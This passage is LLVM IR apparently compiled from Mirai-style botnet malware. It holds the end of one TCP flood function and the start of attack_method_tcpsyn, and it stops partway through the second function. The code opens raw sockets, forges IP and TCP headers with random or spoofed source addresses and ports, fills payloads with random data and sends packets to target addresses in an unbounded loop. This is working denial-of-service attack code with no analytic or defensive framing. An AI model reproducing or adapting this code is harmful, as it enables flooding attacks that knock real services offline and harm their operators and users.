  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 1458)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %440

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %440

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %277, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %280

; <label>:123:                                    ; preds = %118
  store i8* getelementptr inbounds ([513 x i8], [513 x i8]* @.str.256, i32 0, i32 0), i8** %31, align 8
  %124 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 512
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, 15
  %145 = or i8 %144, 64
  store i8 %145, i8* %142, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, -16
  %150 = or i8 %149, 5
  store i8 %150, i8* %147, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %26, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 40, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 3
  store i16 %162, i16* %164, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 5
  store i8 %165, i8* %167, align 4
  %168 = load i8, i8* %15, align 1
  %169 = icmp ne i8 %168, 0
  br i1 %169, label %170, label %174

; <label>:170:                                    ; preds = %123
  %171 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %170, %123
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  store i8 6, i8* %176, align 1
  %177 = load i32, i32* %28, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  store i32 %185, i32* %187, align 4
  %188 = load i16, i16* %16, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  store i16 %189, i16* %191, align 4
  %192 = load i16, i16* %17, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %18, align 4
  %197 = trunc i32 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = zext i16 %198 to i32
  %200 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 2
  store i32 %199, i32* %201, align 4
  %202 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -241
  %206 = or i16 %205, 80
  store i16 %206, i16* %203, align 4
  %207 = load i8, i8* %20, align 1
  %208 = sext i8 %207 to i16
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 4
  %211 = load i16, i16* %210, align 4
  %212 = and i16 %208, 1
  %213 = shl i16 %212, 13
  %214 = and i16 %211, -8193
  %215 = or i16 %214, %213
  store i16 %215, i16* %210, align 4
  %216 = load i8, i8* %21, align 1
  %217 = sext i8 %216 to i16
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %217, 1
  %222 = shl i16 %221, 12
  %223 = and i16 %220, -4097
  %224 = or i16 %223, %222
  store i16 %224, i16* %219, align 4
  %225 = load i8, i8* %22, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 11
  %232 = and i16 %229, -2049
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %23, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 10
  %241 = and i16 %238, -1025
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %24, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 9
  %250 = and i16 %247, -513
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %25, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 8
  %259 = and i16 %256, -257
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = call i32 @rand() #6
  %262 = srem i32 %261, 65535
  %263 = trunc i32 %262 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 5
  store i16 %263, i16* %265, align 2
  %266 = load i8, i8* %22, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %274

; <label>:268:                                    ; preds = %174
  %269 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %271, -2049
  %273 = or i16 %272, 2048
  store i16 %273, i16* %270, align 4
  br label %274

; <label>:274:                                    ; preds = %268, %174
  %275 = load i8*, i8** %31, align 8
  %276 = load i32, i32* %26, align 4
  call void @rand_str(i8* %275, i32 %276)
  br label %277

; <label>:277:                                    ; preds = %274
  %278 = load i32, i32* %9, align 4
  %279 = add nsw i32 %278, 1
  store i32 %279, i32* %9, align 4
  br label %118

; <label>:280:                                    ; preds = %118
  br label %281

; <label>:281:                                    ; preds = %439, %280
  store i32 0, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %436, %281
  %283 = load i32, i32* %9, align 4
  %284 = load i8, i8* %5, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp slt i32 %283, %285
  br i1 %286, label %287, label %439

; <label>:287:                                    ; preds = %282
  %288 = load i8**, i8*** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds i8*, i8** %288, i64 %290
  %292 = load i8*, i8** %291, align 8
  store i8* %292, i8** %32, align 8
  %293 = load i8*, i8** %32, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  store %struct.iphdr* %294, %struct.iphdr** %33, align 8
  %295 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i64 1
  %297 = bitcast %struct.iphdr* %296 to %struct.tcphdr*
  store %struct.tcphdr* %297, %struct.tcphdr** %34, align 8
  %298 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i64 1
  %300 = bitcast %struct.tcphdr* %299 to i8*
  store i8* %300, i8** %35, align 8
  %301 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 2
  %306 = load i8, i8* %305, align 4
  %307 = zext i8 %306 to i32
  %308 = icmp slt i32 %307, 32
  br i1 %308, label %309, label %330

; <label>:309:                                    ; preds = %287
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 %315) #7
  %317 = call i32 @rand_next()
  %318 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %319 = load i32, i32* %9, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i64 %320
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i32 0, i32 2
  %323 = load i8, i8* %322, align 4
  %324 = zext i8 %323 to i32
  %325 = lshr i32 %317, %324
  %326 = add i32 %316, %325
  %327 = call i32 @htonl(i32 %326) #7
  %328 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  store i32 %327, i32* %329, align 4
  br label %330

; <label>:330:                                    ; preds = %309, %287
  %331 = load i32, i32* %28, align 4
  %332 = icmp eq i32 %331, -1
  br i1 %332, label %333, label %337

; <label>:333:                                    ; preds = %330
  %334 = call i32 @rand_next()
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 8
  store i32 %334, i32* %336, align 4
  br label %337

; <label>:337:                                    ; preds = %333, %330
  %338 = load i16, i16* %13, align 2
  %339 = zext i16 %338 to i32
  %340 = icmp eq i32 %339, 65535
  br i1 %340, label %341, label %347

; <label>:341:                                    ; preds = %337
  %342 = call i32 @rand_next()
  %343 = and i32 %342, 65535
  %344 = trunc i32 %343 to i16
  %345 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 3
  store i16 %344, i16* %346, align 4
  br label %347

; <label>:347:                                    ; preds = %341, %337
  %348 = load i16, i16* %16, align 2
  %349 = zext i16 %348 to i32
  %350 = icmp eq i32 %349, 65535
  br i1 %350, label %351, label %357

; <label>:351:                                    ; preds = %347
  %352 = call i32 @rand_next()
  %353 = and i32 %352, 65535
  %354 = trunc i32 %353 to i16
  %355 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  store i16 %354, i16* %356, align 4
  br label %357

; <label>:357:                                    ; preds = %351, %347
  %358 = load i16, i16* %17, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %367

; <label>:361:                                    ; preds = %357
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 1
  store i16 %364, i16* %366, align 2
  br label %367

; <label>:367:                                    ; preds = %361, %357
  %368 = load i32, i32* %18, align 4
  %369 = icmp eq i32 %368, 65535
  br i1 %369, label %370, label %374

; <label>:370:                                    ; preds = %367
  %371 = call i32 @rand_next()
  %372 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 2
  store i32 %371, i32* %373, align 4
  br label %374

; <label>:374:                                    ; preds = %370, %367
  %375 = load i32, i32* %19, align 4
  %376 = icmp eq i32 %375, 65535
  br i1 %376, label %377, label %381

; <label>:377:                                    ; preds = %374
  %378 = call i32 @rand_next()
  %379 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 3
  store i32 %378, i32* %380, align 4
  br label %381

; <label>:381:                                    ; preds = %377, %374
  %382 = load i8, i8* %27, align 1
  %383 = icmp ne i8 %382, 0
  br i1 %383, label %384, label %387

; <label>:384:                                    ; preds = %381
  %385 = load i8*, i8** %35, align 8
  %386 = load i32, i32* %26, align 4
  call void @rand_str(i8* %385, i32 %386)
  br label %387

; <label>:387:                                    ; preds = %384, %381
  %388 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 7
  store i16 0, i16* %389, align 2
  %390 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %391 = bitcast %struct.iphdr* %390 to i16*
  %392 = call zeroext i16 @checksum_generic(i16* %391, i32 20)
  %393 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  %395 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 6
  store i16 0, i16* %396, align 4
  %397 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %398 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %399 = bitcast %struct.tcphdr* %398 to i8*
  %400 = load i32, i32* %26, align 4
  %401 = sext i32 %400 to i64
  %402 = add i64 20, %401
  %403 = trunc i64 %402 to i16
  %404 = call zeroext i16 @htons(i16 zeroext %403) #7
  %405 = load i32, i32* %26, align 4
  %406 = sext i32 %405 to i64
  %407 = add i64 20, %406
  %408 = trunc i64 %407 to i32
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %397, i8* %399, i16 zeroext %404, i32 %408)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %32, align 8
  %423 = load i32, i32* %26, align 4
  %424 = sext i32 %423 to i64
  %425 = add i64 40, %424
  %426 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %427 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 0
  %432 = bitcast %struct.sockaddr_in* %431 to %struct.sockaddr*
  store %struct.sockaddr* %432, %struct.sockaddr** %426, align 8
  %433 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %434 = load %struct.sockaddr*, %struct.sockaddr** %433, align 8
  %435 = call i64 @sendto(i32 %421, i8* %422, i64 %425, i32 16384, %struct.sockaddr* %434, i32 16)
  br label %436

; <label>:436:                                    ; preds = %387
  %437 = load i32, i32* %9, align 4
  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %282

; <label>:439:                                    ; preds = %282
  br label %281

; <label>:440:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %437

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %437

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %285, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %288

